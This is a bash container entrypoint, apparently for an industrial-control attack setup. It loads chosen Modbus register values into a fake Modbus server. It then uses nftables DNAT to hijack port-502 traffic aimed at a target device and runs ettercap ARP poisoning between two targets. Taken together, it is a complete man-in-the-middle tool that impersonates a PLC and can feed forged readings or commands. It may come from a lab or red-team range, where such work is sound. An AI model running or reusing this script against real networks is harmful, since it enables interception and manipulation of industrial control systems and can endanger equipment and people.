#!/usr/bin/env bash
set -e

# Function to update registers in server_config.json
update_config() {
    local type=$1
    local id=$2
    local value=$3
    local json_path=$4

    echo "Setting $type register $id to $value"
    tmp=$(mktemp)
    jq --arg id "$id" --argjson val "$value" \
       "$json_path[\$id] = \$val" /server_config.json > "$tmp" && mv "$tmp" /server_config.json
    chmod 644 /server_config.json
}

# Process environment variables for registers
env | grep '^M_' | while read -r line; do
    var_name=$(echo "$line" | cut -d= -f1)
    value=$(echo "$line" | cut -d= -f2-)
    
    # Extract ID from variable name (e.g., M_COIL_1 -> 1)
    id=$(echo "$var_name" | awk -F_ '{print $NF}')
    
    case "$var_name" in
        M_COIL_*)
            update_config "coil" "$id" "$value" ".registers.coils"
            ;;
        M_HOLDING_*)
            update_config "holdingRegister" "$id" "$value" ".registers.holdingRegister"
            ;;
        M_DISCRETE_*)
            update_config "discreteInput" "$id" "$value" ".registers.discreteInput"
            ;;
        M_INPUT_*)
            update_config "inputRegister" "$id" "$value" ".registers.inputRegister"
            ;;
    esac
done

if [ -z "$INTERFACE" ]; then
    INTERFACE="eth1"
fi

# Setup nftables if TARGET1 is set
if [ -n "$TARGET1" ]; then
    echo "Setting up nftables..."
    # Get current IP
    MY_IP=$(ip -4 addr show dev "$INTERFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    
    if [ -n "$MY_IP" ]; then
        sudo nft add table ip nat
        sudo nft 'add chain ip nat prerouting { type nat hook prerouting priority -100; }'
        sudo nft 'add chain ip nat postrouting { type nat hook postrouting priority 100; }'
        sudo nft add rule ip nat prerouting ip daddr "$TARGET1" tcp dport 502 dnat to "$MY_IP":502
    else
        echo "Could not determine IP for interface $INTERFACE. Skipping nftables setup."
    fi
fi

# Start Modbus Server in the background
echo "Starting Modbus Server..."
modbus-server &
MODBUS_PID=$!

# Wait for Modbus Server to start
sleep 2

# Start Ettercap if configured
if [ -n "$INTERFACE" ] && [ -n "$TARGET1" ] && [ -n "$TARGET2" ]; then
    echo "Starting Ettercap ARP poisoning..."
    echo "Interface: $INTERFACE"
    echo "Target 1: $TARGET1"
    echo "Target 2: $TARGET2"
    
    # Run ettercap in background
    # ettercap -i ${INTERFACE} -T -M arp:remote /${TARGET1}// /${TARGET2}//
    ettercap -i "$INTERFACE" -T -M arp:remote /"$TARGET1"// /"$TARGET2"// &
    ETTERCAP_PID=$!
else
    echo "Ettercap configuration missing (INTERFACE, TARGET1, TARGET2). Skipping ARP poisoning."
fi

# Function to handle termination
cleanup() {
    echo "Stopping services..."
    sudo nft delete table ip nat 2>/dev/null || true
    if [ -n "$ETTERCAP_PID" ]; then
        kill "$ETTERCAP_PID" 2>/dev/null || true
    fi
    if [ -n "$MODBUS_PID" ]; then
        kill "$MODBUS_PID" 2>/dev/null || true
    fi
    exit 0
}

trap cleanup SIGTERM SIGINT

# Keep container alive even if processes die
while true; do
  sleep 1
done
